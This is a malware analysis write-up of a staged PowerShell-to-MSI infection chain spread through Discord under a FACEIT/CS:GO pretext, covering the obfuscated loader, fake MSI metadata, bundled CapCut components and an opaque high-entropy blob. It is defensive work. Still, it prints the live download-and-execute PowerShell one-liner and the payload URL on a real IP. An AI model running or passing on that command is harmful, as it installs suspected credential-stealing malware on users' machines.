# Suspicious PowerShell-Delivered MSI Analysis Write-Up

## Summary

This analysis began with a suspicious PowerShell one-liner:

```powershell
powershell -c "iex(irm '85.239.149.40/FnjVsLKEJb2Jall3wx' -UseBasicParsing)"
```

The command downloads remote PowerShell code from a raw IP address and immediately executes it in memory using `Invoke-Expression`. This pattern is commonly associated with loaders, droppers, and malware delivery chains.

The downloaded script was heavily obfuscated. It contained many junk variables and a large Base64-encoded payload split across multiple variables. After deobfuscation, the script was found to decode and execute a second-stage PowerShell script.

The second-stage script downloaded an MSI installer from:

```text
http://85.239.149.40:6600/5sxu2qr5/UICBDMW.msi
```

The script saved the MSI under:

```text
C:\ProgramData\Zooms\UICBDMW.msi
```

and executed it silently with `msiexec`.

## Reported Distribution Context

The sample was reportedly distributed through social engineering on Discord. The alleged scammers used a Discord bot or Discord-based interaction to convince users to run the PowerShell command, claiming it was required to play FACEIT / CS:GO.

The initial command provided to victims was:

```powershell
powershell -c "iex(irm '85.239.149.40/FnjVsLKEJb2Jall3wx' -UseBasicParsing)"

## Execution Chain

The observed execution chain was:

```text
PowerShell one-liner
→ Invoke-RestMethod downloads script from raw IP
→ Invoke-Expression executes script in memory
→ Obfuscated PowerShell decodes Base64 payload
→ Hidden PowerShell process launches second-stage script
→ Second-stage script downloads MSI from raw IP on port 6600
→ MSI is executed silently
```

This delivery method is suspicious because it uses:

* Remote script execution from a raw IP address
* Heavy PowerShell obfuscation
* Base64-encoded staged payloads
* Hidden PowerShell execution
* Execution policy bypass
* Silent MSI installation

## MSI Findings

The MSI file was extracted and inspected with `7z`. It contained 16 embedded files. Most were Windows PE files, mainly DLLs, plus one GUI executable and two generic data files.

The MSI metadata was unusual:

```text
ProductName: Sizarship
Manufacturer: Veil Patron
Install folder: LocalAppDataFolder\Teel
```

These names do not match the apparent CapCut/ByteDance components found inside the installer.

The MSI file table mapped the random internal filenames to installed filenames such as:

```text
P0kk0eAnsGQS → EPixe20.exe
GkCaSpXcg95SIo8m → Qt6Core.dll
Y8p1Gq0n7iNF → VEConfig.dll
S3cwB5EdKcaF4u5M → VECrashMonitor.dll
t0Mhrk0VAbsv → VESafeGuard.dll
ICnGNGxT → libcrypto-1_1-x64.dll
iXzxVqBqNYNtJjOM5gz → libssl-1_1-x64.dll
viM6fon1J7MG1Wb → libcurl.dll
US8yBGmyj → tracker32.bin
Pm7KFbOWP5 → buffer-layer.tmp
```

The main executable appears to be:

```text
EPixe20.exe
```

The MSI also appeared to contain a custom action named:

```text
LaunchFile
```

which likely launches the installed executable after installation.

## CapCut / ByteDance Indicators

Several extracted files contained CapCut or ByteDance-related strings. The main executable and DLLs referenced components such as:

```text
CapCut.exe
VEConfig.dll
VESafeGuard.dll
VECrashMonitor.dll
Qt6Core.dll
libcurl.dll
```

Some files also contained CapCut-related API endpoints and ByteDance-related strings. Certificate data extracted from at least two PE files showed a ByteDance code-signing certificate chain.

This suggests the MSI likely contains real CapCut/ByteDance components, or components copied from a legitimate CapCut installation.

However, the suspicious delivery chain, fake MSI metadata, renamed executable, and unusual install path indicate that this is likely a repackaged or fake installer rather than a normal CapCut installer.

## `tracker32.bin` Analysis

One of the most interesting files was:

```text
US8yBGmyj → tracker32.bin
```

The file had high entropy:

```text
tracker32.bin size: 2,279,810 bytes
entropy: 7.913
```

Initial file analysis identified it as generic data. It did not appear to be a normal executable, ZIP archive, gzip file, 7z archive, SQLite database, or normal PNG image.

Further inspection found many PNG-style chunk markers:

```text
IDAT
IEND
```

The file contained repeated `IDAT` chunks and ended with a valid-looking `IEND` marker. Manual parsing showed:

```text
277 chunks
IDAT chunks mostly 8192 bytes
IEND chunk at the end
0 bad CRCs
```

This means the file uses valid PNG-style chunk framing:

```text
[length][IDAT][data][CRC]
[length][IDAT][data][CRC]
...
[IEND]
```

However, the combined IDAT data failed normal PNG/zlib decompression:

```text
zlib: incorrect header check
raw deflate: invalid block type
gzip: not a gzipped file
bz2: invalid data stream
lzma/xz: unsupported input
```

This indicates that `tracker32.bin` is not a valid PNG image, even though it uses PNG-like chunk structure.

The most likely explanations are:

1. A custom resource container using PNG-style chunks
2. An encrypted or packed resource blob
3. A nonstandard application data file
4. A decoy or obfuscated asset used by the bundled application

At this stage, `tracker32.bin` has not been proven to be executable malware, but it is suspicious because it is high-entropy, nonstandard, and intentionally structured.

## Current Assessment

Based on the evidence collected so far, this sample should be treated as suspicious or malicious.

The strongest suspicious indicators are:

* Remote PowerShell execution from a raw IP
* Obfuscated Base64 PowerShell loader
* Hidden PowerShell execution
* Execution policy bypass
* MSI downloaded from raw IP on nonstandard port
* Silent MSI execution
* Fake-looking MSI product and manufacturer metadata
* Installation into a strange LocalAppData folder
* Main executable renamed to `EPixe20.exe`
* Bundled CapCut/ByteDance components under fake installer branding
* Presence of an opaque high-entropy file named `tracker32.bin`

The analysis has not yet proven account theft, Steam theft, Gmail theft, or browser credential theft. No clear static strings for Steam, Gmail, browser cookie theft, Discord token theft, or password stealing were confirmed in the steps completed so far.

The current best classification is:

```text
Suspicious PowerShell-delivered fake/repackaged CapCut-like MSI installer.
Likely unwanted or malicious delivery chain.
Contains signed CapCut/ByteDance-looking components and an opaque high-entropy resource blob.
No confirmed credential-stealing behavior yet from static analysis performed so far.
```

## Recommended VirusTotal Submission Set

The following files are worth submitting separately:

```text
Original PowerShell script
decoded.ps1
UICBDMW.msi
EPixe20.exe / P0kk0eAnsGQS
Qt6Core.dll / GkCaSpXcg95SIo8m
VEConfig.dll / Y8p1Gq0n7iNF
tracker32.bin / US8yBGmyj
tracker32_idat_payload.bin
buffer-layer.tmp / Pm7KFbOWP5
```

Suggested VirusTotal comment:

```text
Suspicious PowerShell-delivered MSI. Initial command uses IEX/IRM from raw IP 85.239.149.40. Obfuscated PowerShell decodes a second stage, launches hidden PowerShell with execution policy bypass, downloads UICBDMW.msi from 85.239.149.40:6600, and silently installs it. MSI metadata uses fake-looking ProductName “Sizarship” and Manufacturer “Veil Patron”, installs to LocalAppDataFolder\Teel, and launches EPixe20.exe. Extracted files include signed CapCut/ByteDance-looking components plus opaque high-entropy tracker32.bin using valid PNG-style IDAT/IEND chunks with non-zlib data.
```

## Conclusion

This sample should be treated as malicious or highly suspicious.

The technical evidence confirms a suspicious staged PowerShell-to-MSI delivery chain. The reported distribution method — Discord social engineering under the pretext of playing FACEIT / CS:GO — further supports malicious intent.

A confirmed victim report claims Gmail access and temporary Steam account takeover after execution. However, the analysis performed so far has not yet identified the exact credential theft mechanism. Further behavioral analysis would be required to prove whether the sample steals browser cookies, Steam session files, Gmail/Google tokens, or credentials.
